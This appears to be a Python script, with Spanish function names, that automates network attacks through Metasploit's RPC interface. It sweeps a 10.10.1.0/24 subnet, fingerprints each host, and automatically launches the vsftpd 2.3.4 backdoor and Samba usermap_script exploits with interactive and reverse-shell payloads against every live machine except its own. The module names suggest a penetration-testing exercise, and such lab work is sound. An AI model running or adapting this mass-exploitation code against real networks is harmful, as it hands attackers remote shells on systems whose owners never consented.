import time

import netifaces
from pymetasploit3.msfrpc import MsfRpcClient

import F2_threatModeling


def obtener_ip_local():
    try:
        IP = netifaces.ifaddresses('eth0')[netifaces.AF_INET][0]['addr']
    except ValueError:
        IP = '127.0.0.1'
    return IP

def iniciar_metasploit():
    client = MsfRpcClient('msf', server='127.0.0.1', port=55553)
    return client

def seleccionar_y_explotar_vulnerabilidades(client, host, os_info, open_ports):
    if 'vsftpd' in open_ports:
        explotar_vsftpd(client, host)
    if 'samba' in os_info:
        explotar_samba(client, host)
    # Añade más condiciones basadas en la información recopilada

def explotar_vsftpd(client, host):
    exploit_vsftpd = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
    exploit_vsftpd['RHOSTS'] = host
    exploit_vsftpd.execute(payload='cmd/unix/interact')
    time.sleep(10)

def explotar_samba(client, host):
    exploit_samba = client.modules.use('exploit', 'multi/samba/usermap_script')
    exploit_samba['RHOSTS'] = host
    exploit_samba.execute(payload='cmd/unix/reverse')
    time.sleep(10)

def main():
    client = iniciar_metasploit()
    local_ip = obtener_ip_local()
    hosts_activos = F2_threatModeling.host_discovery('10.10.1.1/24')
    for host in hosts_activos:
        if host == local_ip:
            continue
        os_info, open_ports = F2_threatModeling.os_detection_and_port_scanning(host)
        seleccionar_y_explotar_vulnerabilidades(client, host, os_info, open_ports)